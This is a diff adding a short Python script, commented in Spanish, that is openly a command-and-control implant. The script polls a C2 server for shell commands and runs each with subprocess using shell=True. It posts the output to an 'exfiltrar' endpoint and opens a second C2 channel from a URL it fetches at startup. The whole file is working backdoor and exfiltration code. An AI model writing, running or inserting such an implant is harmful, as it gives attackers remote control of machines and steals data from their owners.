@@ -1,0 +1,31 @@
+import requests
+import threading
+import subprocess
+
+def manejar_servidor(url_servidor):
+    while True:
+        try:
+            # Obtener comando del servidor C2
+            respuesta = requests.get(f"{url_servidor}/comando")
+            comando = respuesta.text
+
+            if comando.lower() == "exit":
+                break
+
+            # Ejecutar el comando del sistema y capturar salida
+            resultado_comando = subprocess.run(comando, shell=True, capture_output=True, text=True)
+            datos_a_exfiltrar = resultado_comando.stdout + resultado_comando.stderr
+
+            # Exfiltrar los datos al servidor C2
+            requests.post(f"{url_servidor}/exfiltrar", data=datos_a_exfiltrar.encode('utf-8'))
+
+        except Exception as e:
+            print(f"Error en la conexión con {url_servidor}: {e}")
+            break
+
+url_primario = "http://localhost:5000"
+url_secundario = requests.get(f"{url_primario}/servidor_secundario").text
+
+# Iniciar hilos para manejar comunicación con ambos servidores C2
+threading.Thread(target=manejar_servidor, args=(url_primario,)).start()
+threading.Thread(target=manejar_servidor, args=(url_secundario,)).start()
